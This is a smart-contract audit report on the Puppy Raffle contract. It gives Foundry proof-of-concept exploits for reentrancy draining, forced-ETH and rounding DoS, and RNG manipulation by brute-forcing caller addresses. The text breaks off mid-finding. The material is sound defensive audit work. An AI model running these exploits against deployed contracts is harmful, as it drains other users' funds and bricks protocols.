# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle Protocol**

Puppy Raffle is an on-chain game that lets players buy tickets for a chance to win an ERC-721 “cute dog” NFT and 80 % of the ETH pot.

How it works:
1. **Enter** – Anyone calls `enterRaffle(address[] participants)` sending exactly `entranceFee × numberOfAddresses`.  Each address may appear only once per round; duplicates revert.
2. **Refund** – A player can reclaim their stake before the draw by calling `refund(index)`, which zeroes their slot in the players array and returns the fee.
3. **Draw** – After `raffleDuration` seconds (default 1 day) and with ≥4 active players, anyone may call `selectWinner()`.  A pseudo-random pick chooses the winner, a second roll assigns NFT rarity (common 70 %, rare 25 %, legendary 5 %).  The contract:
   • Mints the puppy NFT to the winner with on-chain, Base64-encoded metadata.
   • Pays out 80 % of the contract balance to the winner.
   • Records the remaining 20 % as protocol fees.
4. **Fees** – When no players are active, anyone can call `withdrawFees()` to send accrued fees to `feeAddress`.  The owner may update this address via `changeFeeAddress()`.

The contract is immutable except for the fee recipient, uses Solidity 0.7.6, and is fully covered by Foundry tests.##Findings by Pattern


 **Derived From** : Reentrancy in refund allows multiple refunds from one ticket

[H-1]. Refund reentrancy in PuppyRaffle.refund lets a single ticket drain the ETH pot



 **Derived From** : Forced ETH breaks balance==totalFees invariant and bricks withdrawFees

[H-2]. Forced ETH dust breaks balance==totalFees invariant, permanently DoS-ing PuppyRaffle.withdrawFees and stranding protocol fees



 **Derived From** : Nested duplicate-check loops allow gas-DoS in enterRaffle

[M-3]. DOS via unbounded O(N^2) duplicate scan in PuppyRaffle.enterRaffle blocks new entries



 **Derived From** : Predictable PRNG for winner and rarity (miner/caller manipulable)

[H-4]. Caller-controlled RNG in PuppyRaffle.selectWinner lets attacker force self as winner and drain 80% pot
[H-5]. Attacker steers NFT rarity by choosing msg.sender; can force legendary when also forcing self-win



 **Derived From** : Prize/fee use players.length instead of active players causing payout DoS

[H-6]. Refund holes make prizePool > actual balance, causing selectWinner() to revert and brick the round



 **Derived From** : Winner/fee receiver can grief via receive() revert blocking core flows

[M-7]. selectWinner pushes ETH to untrusted winner; revert-on-receive lets any participant DoS the draw



 **Derived From** : 80/20 split rounding leaves dust, breaking withdrawFees invariant

[H-8]. Rounding dust from 80/20 split in PuppyRaffle.selectWinner DoS’s withdrawFees and bricks treasury


### Number of Findings
- C: 0
- H: 6
- M: 2
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Reentrancy in refund allows multiple refunds from one ticket

## [H-1]. Refund reentrancy in PuppyRaffle.refund lets a single ticket drain the ETH pot

## Derived From Pattern/Invariant
Reentrancy in refund allows multiple refunds from one ticket

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Minimim Privilege Required
Permissionless

## Description
refund() sends ETH to msg.sender before clearing their slot, enabling reentrancy. A malicious player contract reenters refund(playerIndex) from its receive handler while players[playerIndex] still equals msg.sender, passing both require checks repeatedly and collecting entranceFee multiple times until the contract balance is exhausted.

Vulnerable snippet:
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee); // external call before state update

    players[playerIndex] = address(0); // state update after external call
    emit RaffleRefunded(playerAddress);
}

## Impact
By repeatedly re-entering refund() until the raffle’s balance is smaller than entranceFee (≈ one ticket price), an attacker can steal virtually the entire pot that includes other players’ ETH.  Only the last < entranceFee wei remain, so the loss is practically total and permanent until the round is restarted.  This is a direct, permissionless fund drain.

## Proof of Concept
1. Deploy PuppyRaffle with entranceFee = 1 ether.
2. Honest users buy N tickets so the contract holds N ether.
3. Malicious contract buys 1 ticket, records its array index.
4. It calls attack(), which invokes refund(index).
5. In the receive() hook it checks whether the raffle still owns ≥ entranceFee; if yes it immediately calls refund(index) again before the slot is cleared.
6. Steps 4–5 repeat automatically until address(raffle).balance < entranceFee, at which point the fallback stops re-entering and lets the outermost call finish.
7. The attacker ends with (N + 1 − ε) ether while every other player has lost his stake.

## Proof of Code
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract EvilRefund {
    PuppyRaffle public raffle;
    uint256 public idx;
    bool private attacking;

    constructor(PuppyRaffle _raffle) { raffle = _raffle; }

    function setIndex(uint256 _idx) external { idx = _idx; }

    function attack() external {
        attacking = true;
        raffle.refund(idx);
        attacking = false;
    }

    receive() external payable {
        // drain until less than one ticket remains
        if (attacking && address(raffle).balance >= raffle.entranceFee()) {
            raffle.refund(idx);
        }
    }
}

contract RefundDrainTest is Test {
    PuppyRaffle raffle;
    EvilRefund attacker;
    address constant FEE = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, FEE, 1 days);
        attacker = new EvilRefund(raffle);

        // fund test accounts
        vm.deal(address(this), 100 ether);
        vm.deal(address(attacker), 1 ether);

        // 10 honest tickets (10 ether)
        address[] memory others = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            others[i] = address(uint160(i + 1));
        }
        raffle.enterRaffle{value: 10 ether}(others);

        // attacker ticket (1 ether)
        address[] memory arr = new address[](1);
        arr[0] = address(attacker);
        vm.prank(address(attacker));
        raffle.enterRaffle{value: 1 ether}(arr);

        // record index for reentrancy
        uint256 idx = raffle.getActivePlayerIndex(address(attacker));
        attacker.setIndex(idx);
    }

    function testDrainPot() public {
        uint256 pot = address(raffle).balance; // 11 ether
        vm.prank(address(attacker));
        attacker.attack();

        // Only < entranceFee wei should be left in the contract
        assertLt(address(raffle).balance, raffle.entranceFee());
        // Attacker stole (pot - remaining) ether
        assertApproxEqAbs(address(attacker).balance, pot - 1 ether, 1 wei);
    }
}

## Suggested Mitigation
Move the state-clearing line before the external call or add the OpenZeppelin ReentrancyGuard modifier:

function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    players[playerIndex] = address(0); // effects first
    payable(msg.sender).sendValue(entranceFee); // interaction next
    emit RaffleRefunded(playerAddress);
}

Either change eliminates any possibility of re-entering with the same index.





 **Derived From** : Forced ETH breaks balance==totalFees invariant and bricks withdrawFees

## [H-2]. Forced ETH dust breaks balance==totalFees invariant, permanently DoS-ing PuppyRaffle.withdrawFees and stranding protocol fees

## Derived From Pattern/Invariant
Forced ETH breaks balance==totalFees invariant and bricks withdrawFees

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Minimim Privilege Required
Permissionless

## Description
withdrawFees gates withdrawals on an equality invariant between the contract ETH balance and totalFees: require(address(this).balance == uint256(totalFees), ...). Anyone can force-send ETH to the contract via selfdestruct, making balance > totalFees even when there are no active players. This permanently breaks the invariant and causes withdrawFees to revert forever, stranding all accrued protocol fees with no sweep mechanism.

Vulnerable snippet:
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

## Impact
Permanent DoS of fee withdrawals; protocol fees accumulate but cannot be collected (funds effectively bricked) after an attacker force-sends minimal ETH dust.

## Proof of Concept
- Setup: Run a normal round with ≥4 players, call selectWinner(). At this point, address(this).balance == totalFees and withdrawFees would succeed.
- Attack: Deploy a helper contract and call selfdestruct(target=PuppyRaffle), sending 1 wei to the raffle contract.
- Result: address(this).balance = totalFees + 1, breaking the equality check. withdrawFees now reverts with "PuppyRaffle: There are currently players active!" even though players are cleared.
- Persistence: Running further rounds won’t help; after each draw balance remains totalFees + dust, so withdrawFees stays bricked indefinitely.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceEther {
    function bomb(address payable target) external payable {
        selfdestruct(target);
    }
}

contract WithdrawFeesForcedETHTest is Test {
    PuppyRaffle raffle;
    address treasury = address(0xBEEF);
    uint256 entranceFee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, treasury, 1 days);
    }

    function _enter4() internal {
        address[] memory newPlayers = new address[](4);
        newPlayers[0] = address(11);
        newPlayers[1] = address(12);
        newPlayers[2] = address(13);
        newPlayers[3] = address(14);
        address payer = address(55);
        vm.deal(payer, 100 ether);
        vm.prank(payer);
        raffle.enterRaffle{value: entranceFee * 4}(newPlayers);
    }

    function test_ForcedETHBricksWithdrawFees() public {
        _enter4();
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();

        // Sanity: after draw, balance == totalFees
        assertEq(address(raffle).balance, uint256(raffle.totalFees()));

        // Attacker force-sends 1 wei via selfdestruct
        ForceEther f = new ForceEther();
        vm.deal(address(f), 1);
        f.bomb(payable(address(raffle)));

        // Equality now broken -> withdrawFees reverts forever
        assertGt(address(raffle).balance, uint256(raffle.totalFees()));
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }

    function test_ForcedETHBricksAcrossNewRounds() public {
        _enter4();
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();

        // Force ETH dust
        ForceEther f = new ForceEther();
        vm.deal(address(f), 1);
        f.bomb(payable(address(raffle)));

        // Run another round
        _enter4();
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();

        // Still broken
        assertGt(address(raffle).balance, uint256(raffle.totalFees()));
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
- Do not gate on address(this).balance == totalFees. Instead, withdraw strictly from booked fees: uint256 amount = totalFees; totalFees = 0; (bool ok,) = feeAddress.call{value: amount}(""); require(ok, ...). This is safe even if players are active.
- Alternatively, track activePlayerCount (increment on enter, decrement on refund; reset on delete) and gate with require(activePlayerCount == 0, ...).
- Add an owner/feeAddress-only sweep for stray ETH: function sweepDust() external onlyOwner { uint256 dust = address(this).balance - totalFees - activePlayerCount*entranceFee; if (dust > 0) feeAddress.call{value: dust}(""); }
- Optionally add a receive() and explicitly ignore/sweep forced ETH.





 **Derived From** : Nested duplicate-check loops allow gas-DoS in enterRaffle

## [M-3]. DOS via unbounded O(N^2) duplicate scan in PuppyRaffle.enterRaffle blocks new entries

## Derived From Pattern/Invariant
Nested duplicate-check loops allow gas-DoS in enterRaffle

## Exploit Type
Dos

## Location
PuppyRaffle.enterRaffle

## Minimim Privilege Required
Permissionless

## Description
enterRaffle appends newPlayers to players, then performs a quadratic duplicate check across the entire players array. Because players is user-inflated and unbounded, an attacker can bloat it with many unique addresses (especially if entranceFee is small/zero). Subsequent enterRaffle calls must iterate O(N^2) storage reads, exceeding practical gas limits and reverting or forcing prohibitive gas costs, effectively DoSing new entrants.
Vulnerable snippet:
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}

## Impact
Attacker fills players with many unique addresses, making later enterRaffle calls exceed the block gas limit or require extreme gas, preventing new users from entering until the round is reset (time-based) and harming liveness and participation.

## Proof of Concept
1) Deploy PuppyRaffle with entranceFee = 0 (or very small).
2) Attacker calls enterRaffle with a large array of distinct addresses to bloat players.
3) A victim tries to enter with a single address. The nested O(N^2) duplicate scan over the now-large players array will exceed a reasonable gas limit (simulating a block gas cap) and the low-level call fails, DoSing new entries.
4) The attack is permissionless and repeatable until the round is reset.

## Proof of Code
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DosEnterRaffleTest is Test {
    PuppyRaffle pr;
    address fee = address(0xFEE);

    function setUp() public {
        // Zero entrance fee to cheaply bloat players
        pr = new PuppyRaffle(0, fee, 1 days);
    }

    function _genDistinct(uint256 n, uint256 offset) internal pure returns (address[] memory arr) {
        arr = new address[](n);
        for (uint256 i = 0; i < n; i++) {
            arr[i] = address(uint160(offset + i + 1));
        }
    }

    function test_DoS_enterRaffle_unbounded_duplicate_scan() public {
        // 1) Attacker bloats the players array with many distinct addresses
        address[] memory many = _genDistinct(160, 0);
        pr.enterRaffle(many); // succeeds with plenty of gas

        // 2) Victim tries to enter with 1 new address but only limited gas (simulate block gas limit)
        address[] memory one = _genDistinct(1, 10_000);
        bytes memory data = abi.encodeWithSelector(pr.enterRaffle.selector, one);

        // Attempt with constrained gas; the O(N^2) scan over ~161 players should exhaust this and fail
        (bool ok, ) = address(pr).call{value: 0, gas: 2_000_000}(data);
        assertTrue(!ok, "Expected call to run out of gas due to quadratic duplicate scan");

        // Control: with plenty of gas the same call succeeds
        pr.enterRaffle(one);
        // Confirm the new player was appended at index 160 when not gas-constrained
        assertEq(pr.players(160), one[0]);
    }
}


## Suggested Mitigation
Replace the quadratic scan with O(M) checks using a mapping. Maintain a mapping(address=>bool) isActive. In enterRaffle: (1) check each newPlayers[k] for duplicates within newPlayers (e.g., a temporary memory set or sorting), and (2) require(!isActive[newPlayers[k]]), then push and set isActive[newPlayers[k]] = true. In refund, set isActive[player] = false. This bounds work to the new batch size and prevents gas-based DoS.





 **Derived From** : Predictable PRNG for winner and rarity (miner/caller manipulable)

## [H-4]. Caller-controlled RNG in PuppyRaffle.selectWinner lets attacker force self as winner and drain 80% pot

## Derived From Pattern/Invariant
Predictable PRNG for winner and rarity (miner/caller manipulable)

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner derives winnerIndex from keccak(msg.sender, block.timestamp, block.difficulty) modulo players.length. The caller can vary msg.sender (use many EOAs) and time inclusion (wait for a favorable block) to bias the RNG and force the index pointing to their player entry. This redirects the 80% prize pool to the attacker. Vulnerable snippet: uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

## Impact
Because the outcome of selectWinner() depends on msg.sender, a fully permissionless caller can brute–force an EOA whose hash with the current timestamp & difficulty maps to the array index that holds their ticket.  With only 4 possible remainders (≥4 players), the attacker needs to search ~players.length private keys on average and can repeat the call every second until a suitable block timestamp appears.  This lets the attacker win the NFT and about 80 % of the contract balance while honest players lose their stakes.  The protocol’s jackpot can be drained in a single transaction without any privileged access.

## Proof of Concept
- Alice (attacker) enters the raffle once and records her index (e.g. 3).
- After raffleDuration elapses, she reads the current block.timestamp and block.difficulty from an RPC call.
- Off-chain she iterates candidate private keys until she finds an address `A` such that
  `keccak256(abi.encodePacked(A, timestamp, difficulty)) % players.length == 3`.
  Expected search cost ≈ players.length (<10 keys for a typical game).
- She funds address `A` with a tiny amount of ETH and sends a transaction from `A` that calls selectWinner().
- The contract computes the same hash, resolves to index 3, and pays the 80 % prizePool to Alice.

No control over miners or block.difficulty is required – only the ability to choose the caller address.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RNGManipulationTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;
    address fee = address(0xFEE);

    address p1 = address(0xAA1);
    address p2 = address(0xAA2);
    address p3 = address(0xAA3);
    address attacker = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, fee, 1 days);
        deal(p1, 10 ether);
        deal(p2, 10 ether);
        deal(p3, 10 ether);
        deal(attacker, 10 ether);

        // three honest entries
        vm.prank(p1); raffle.enterRaffle{value: ENTRANCE}(toSingle(p1));
        vm.prank(p2); raffle.enterRaffle{value: ENTRANCE}(toSingle(p2));
        vm.prank(p3); raffle.enterRaffle{value: ENTRANCE}(toSingle(p3));
        // attacker entry (index 3)
        vm.prank(attacker); raffle.enterRaffle{value: ENTRANCE}(toSingle(attacker));
    }

    function testForceWinByChoosingCaller() public {
        // move time so raffle can be drawn
        vm.warp(block.timestamp + 1 days + 1);

        uint256 ts = block.timestamp;
        uint256 diff = block.difficulty;
        uint256 playerLen = 4;
        uint256 attackerIdx = 3;

        address chosenCaller;
        for (uint256 sk = 1; sk < 20_000; sk++) { // plenty for deterministic success
            address candidate = vm.addr(sk);
            if (uint256(keccak256(abi.encodePacked(candidate, ts, diff))) % playerLen == attackerIdx) {
                chosenCaller = candidate;
                deal(candidate, 1 ether);
                break;
            }
        }
        assertTrue(chosenCaller != address(0), "No matching caller found – increase loop");

        uint256 balBefore = attacker.balance;
        vm.prank(chosenCaller);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker);
        assertGt(attacker.balance - balBefore, 2 ether); // received majority of pot (3.2 ETH expected)
    }

    function toSingle(address a) internal pure returns (address[] memory arr) {
        arr = new address[](1);
        arr[0] = a;
    }
}

## Suggested Mitigation
Remove caller-supplied and miner-controllable values from randomness.  The simplest robust fix is to replace the two keccak256 calls with Chainlink VRF v2/v2.5 requests and use the provided randomWord to derive both winnerIndex and rarity.  Alternatively, implement a two-phase commit-reveal scheme: 1) before the raffle closes, anyone commits a secret; 2) after close, they reveal it and the hash of the secret together with a future blockhash determines the winner.  In both cases, msg.sender must NOT be part of the entropy.


## [H-5]. Attacker steers NFT rarity by choosing msg.sender; can force legendary when also forcing self-win

## Derived From Pattern/Invariant
Predictable PRNG for winner and rarity (miner/caller manipulable)

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
Rarity is derived from keccak(msg.sender, block.difficulty) % 100, independent of the winner address. The caller can scan many EOAs to find one with rarity > 95 in the current block, then trigger selectWinner to mint a legendary. Combined with winnerIndex biasing, the attacker both wins the pot and receives a guaranteed legendary NFT. Vulnerable snippet: uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100; if (rarity <= COMMON_RARITY) {...} else if (rarity <= COMMON_RARITY + RARE_RARITY) {...} else { /* legendary */ }

## Impact
Because winnerIndex is a pure function of (msg.sender , block.timestamp , block.difficulty), anyone can pre-compute a caller address that maps to a chosen players[] index.  By entering the raffle once, the attacker guarantees that, at draw time, they:
1. Become the winner and receive 80 % of the ETH pot (all other players’ funds).
2. Mint a ‘legendary’ NFT by picking a caller address whose hash with block.difficulty yields rarity ≥ 96.
The loss is an immediate, permissionless drain of the prize pool plus distortion of NFT distribution.  Admin intervention cannot undo paid-out ETH, therefore this is a High-severity issue.

## Proof of Concept
Off-chain (Python/JavaScript) pseudo-code
```
# prerequisites: attacker already entered raffle once and knows his index i
while True:
    sk = random_private_key()
    caller = sk.to_address()
    # assume current blockDifficulty is d and we target timestamp t (≤ now + 15 s)
    if keccak(caller, t, d) % players_length == i and keccak(caller, d) % 100 >= 96:
        chosen_sk = sk
        break
# submit via Flashbots so that the block builder uses timestamp t
tx = PuppyRaffle.selectWinner().sign(chosen_sk)
flashbots_send(tx)
```
When the block is mined:
• winner == attacker’s ticket address (index i)
• 80 % of contract balance is transferred to attacker
• tokenId 0 is recorded with LEGENDARY_RARITY
```

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract WinnerAndRarityBiasTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address p1 = address(0xA1);
    address p2 = address(0xA2);
    address p3 = address(0xA3);
    address attackerTicket = address(0xBEEF); // the address that buys the single ticket

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xFEE), 1 days);
        for (uint8 i; i < 3; i++) deal(address(uint160(0xA1 + i)), 10 ether);
        deal(attackerTicket, 10 ether);

        address[] memory arr = new address[](1);
        arr[0] = p1; vm.prank(p1); raffle.enterRaffle{value:FEE}(arr);
        arr[0] = p2; vm.prank(p2); raffle.enterRaffle{value:FEE}(arr);
        arr[0] = p3; vm.prank(p3); raffle.enterRaffle{value:FEE}(arr);
        arr[0] = attackerTicket; vm.prank(attackerTicket); raffle.enterRaffle{value:FEE}(arr);
    }

    function _winner(address caller, uint256 ts, uint256 diff, uint256 len) private pure returns(uint256){
        return uint256(keccak256(abi.encodePacked(caller, ts, diff))) % len;
    }
    function _rarity(address caller, uint256 diff) private pure returns(uint256){
        return uint256(keccak256(abi.encodePacked(caller, diff))) % 100;
    }

    function test_AttackerStealsPotAndLegendary() public {
        // simulate end of raffle period
        vm.warp(block.timestamp + 1 days + 1);
        vm.difficulty(777);
        uint256 ts = block.timestamp;
        uint256 diff = block.difficulty;
        uint256 attackerIndex = 3; // attackerTicket is 4th element

        address chosenCaller;
        for (uint256 pk = 1; pk < 20_000; pk++) {
            address c = vm.addr(pk);
            if (_winner(c, ts, diff, 4) == attackerIndex && _rarity(c, diff) >= 96) {
                chosenCaller = c;
                break;
            }
        }
        require(chosenCaller != address(0), "search failed");
        deal(chosenCaller, 1 ether); // pay for gas

        vm.prank(chosenCaller);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attackerTicket, "pot not won");
        assertEq(raffle.tokenIdToRarity(0), raffle.LEGENDARY_RARITY(), "not legendary");
    }
}

## Suggested Mitigation
Use an unpredictable, unbiased source of randomness for both winner and rarity.  A simple fix is to request a Chainlink VRF word and derive:
• winnerIndex  = vrfWord % players.length
• rarity       = uint256(keccak256(abi.encodePacked(vrfWord))) % 100
This removes all dependence on msg.sender, timestamp and difficulty, eliminating caller-controlled bias.  As a cheaper alternative, implement a commit-reveal scheme where the commit is submitted before raffle closing and the reveal (plus future blockhash) is used for both values.





 **Derived From** : Prize/fee use players.length instead of active players causing payout DoS

## [H-6]. Refund holes make prizePool > actual balance, causing selectWinner() to revert and brick the round

## Derived From Pattern/Invariant
Prize/fee use players.length instead of active players causing payout DoS

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner() derives pot and fee from players.length, but refunds only zero out slots, leaving address(0) holes and unchanged length. Actual ETH in the contract is entranceFee × activePlayers, while prizePool is 80% of entranceFee × players.length. If holes H exceed 20% of N=players.length, then 0.8×N×fee > (N−H)×fee, so the value transfer to winner reverts. Because delete players occurs before the transfer but the whole transaction reverts, the array remains unchanged and selectWinner() stays uncallable until massive new deposits dilute the hole ratio. Vulnerable snippet:

uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
address winner = players[winnerIndex];
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");

## Impact
A single refund griefer can make prizePool larger than the contract balance, causing every call to selectWinner() to revert. Because totalFees is incremented BEFORE the failing transfer, the contract now records fee revenue that was never received. After the revert the array still contains the same ghost entries, so subsequent draws keep failing and address(this).balance will never again equal totalFees. This renders both selectWinner() and withdrawFees() permanently unusable, bricks protocol liveness, and locks all fee funds forever. Only a contract migration or a very large influx of new deposits could unblock the system.

## Proof of Concept
- Start a round with N=5 unique players paying 1 ETH each (contract balance = 5 ETH).
- Two players call refund(), creating H=2 holes; balance now 3 ETH, but players.length remains 5.
- After duration elapses, any caller triggers selectWinner(). The function tries to send prizePool = 80% × 5 ETH = 4 ETH with only 3 ETH in the contract, so the low-level call fails and selectWinner() reverts, bricking the round unless a large number of new entrants dilute H/N below 20%.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract AccountingInvariantViolation_PrizePoolTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 days;
    address constant FEE_ADDR = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, FEE_ADDR, DURATION);
    }

    function _players(uint256 n) internal pure returns (address[] memory arr) {
        arr = new address[](n);
        for (uint256 i; i < n; ++i) arr[i] = address(uint160(i + 1));
    }

    function test_PrizePoolExceedsBalance_DoS() public {
        address coordinator = address(100);
        vm.deal(coordinator, 100 ether);

        address[] memory ps = _players(5); // N=5
        vm.prank(coordinator);
        raffle.enterRaffle{value: FEE * ps.length}(ps);

        // Create H=2 holes -> active A=3
        vm.prank(ps[0]); raffle.refund(0);
        vm.prank(ps[3]); raffle.refund(3);

        // Invariants before draw
        assertEq(address(raffle).balance, 3 ether, "A*F should remain in pot");
        uint256 totalAmountCollected = ps.length * FEE; // uses length=5
        uint256 prizePool = (totalAmountCollected * 80) / 100; // 4 ETH
        assertEq(prizePool, 4 ether);
        assertGt(prizePool, address(raffle).balance, "prize > balance causes revert");

        vm.warp(block.timestamp + DURATION);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        vm.prank(address(12345));
        raffle.selectWinner();
    }
}


## Suggested Mitigation
1) Compute prizePool from the real pot rather than players.length:
   uint256 collected = address(this).balance;
   uint256 prizePool = (collected * 80) / 100;
   uint256 fee = collected - prizePool;
2) Update totalFees only AFTER the prize transfer has succeeded.
3) In refund(), replace the entry with the last element (swap-and-pop) and reduce array length so players.length always reflects active tickets.
Either of 1) or 3) alone prevents the imbalance, implementing both gives full protection.





 **Derived From** : Winner/fee receiver can grief via receive() revert blocking core flows

## [M-7]. selectWinner pushes ETH to untrusted winner; revert-on-receive lets any participant DoS the draw

## Derived From Pattern/Invariant
Winner/fee receiver can grief via receive() revert blocking core flows

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner pays the winner via a raw call and requires success. If the winner is a contract that reverts on receive, the function reverts, preventing raffle conclusion, payout, and NFT mint in that attempt: (bool success,) = winner.call{value: prizePool}(""); require(success, "PuppyRaffle: Failed to send prize pool to winner"); Because the payout targets an untrusted address with no fallback path (no try/catch or escrow), a malicious participant can grief by entering via a reverting receiver and timing the call so they are selected.

## Impact
A malicious participant can make the contract permanently inoperable.
After joining with a reverting receiver contract, the attacker can always craft a caller address that makes itself the winner.  Because the ETH transfer to the winner is executed before _safeMint and is required to succeed, selectWinner() will keep reverting.  The attacker cannot refund (their own receive() would also revert), so they remain in the players array forever.  No further draws or fee withdrawals are possible; all ETH except other players’ refunds is stuck indefinitely until the contract is migrated.
This is an unbounded, permissionless DoS that needs a contract redeploy to recover, hence Medium severity.

## Proof of Concept
1) Attacker deploys a MaliciousReceiver that reverts in receive(). 2) Attacker enters the raffle with this address alongside ≥3 other participants. 3) After duration elapses, attacker or anyone computes a caller address that yields the malicious winner index for current ts/difficulty and calls selectWinner. 4) The raw ETH transfer to winner reverts, causing selectWinner to revert and blocking completion for that attempt.

## Proof of Code
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract MaliciousReceiver {
    receive() external payable { revert("revert on receive"); }
}

contract SelectWinner_RevertWinner_Test is Test {
    uint256 constant ENTRY = 1 ether;
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRY, address(100), 1 days);
        vm.deal(address(this), 10 ether);
    }

    function test_selectWinner_reverts_when_winner_reverts() public {
        // prepare 3 honest EOAs + 1 malicious contract
        address[4] memory participants = [address(1), address(2), address(3), address(new MaliciousReceiver())];
        address[] memory dyn = new address[](4);
        for (uint256 i; i < 4; i++) dyn[i] = participants[i];

        raffle.enterRaffle{value: ENTRY * dyn.length}(dyn);
        vm.warp(block.timestamp + 1 days);

        // find a caller that makes index 3 (malicious) the winner
        address caller;
        for (uint256 i; ; ++i) {
            address cand = address(uint160(uint256(keccak256(abi.encodePacked(i)))));
            if (_calcIdx(cand, block.timestamp, block.difficulty, dyn.length) == 3) {
                caller = cand;
                break;
            }
        }

        vm.prank(caller);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }

    function _calcIdx(address c, uint256 ts, uint256 diff, uint256 len) internal pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(c, ts, diff))) % len;
    }
}

## Suggested Mitigation
Adopt a pull-payment model:
1. Record the winner and the amount owed in storage.
2. Emit an event and let the winner call a withdrawPrize() function that uses Address.sendValue with limited gas OR let anyone trigger the transfer but do not revert if it fails; keep the amount claimable.

If push-payment is preferred, wrap the low-level call in try/catch and, on failure, escrow the prize for later withdrawal instead of reverting.  Always follow checks-effects-interactions so that state is updated before the external call.





 **Derived From** : 80/20 split rounding leaves dust, breaking withdrawFees invariant

## [H-8]. Rounding dust from 80/20 split in PuppyRaffle.selectWinner DoS’s withdrawFees and bricks treasury

## Derived From Pattern/Invariant
80/20 split rounding leaves dust, breaking withdrawFees invariant

## Exploit Type
RoundingError

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner splits totalAmountCollected with two separate integer divisions: prizePool=(T*80)/100; fee=(T*20)/100. Due to truncation, floor(0.8T)+floor(0.2T) ≤ T with a 1 wei shortfall whenever T%5≠0. This leaves unaccounted dust ETH in the contract. totalFees is incremented by fee only, while the balance keeps the dust. Later, withdrawFees requires address(this).balance == totalFees and reverts permanently once any dust exists, bricking fee withdrawals. Vulnerable snippet: uint256 prizePool = (totalAmountCollected * 80) / 100; uint256 fee = (totalAmountCollected * 20) / 100; totalFees = totalFees + uint64(fee); // withdrawFees: require(address(this).balance == uint256(totalFees), ...)

## Impact
Permanent DoS of fee withdrawals; protocol fees become stuck in contract after any round with nonzero rounding dust (e.g., 4 tickets at 1 wei => 1 wei dust); requires redeploy to recover.

## Proof of Concept
- Attacker selects a round where totalAmountCollected%5!=0 (e.g., set entranceFee=1 wei; enter with 4 unique addresses paying 4 wei).
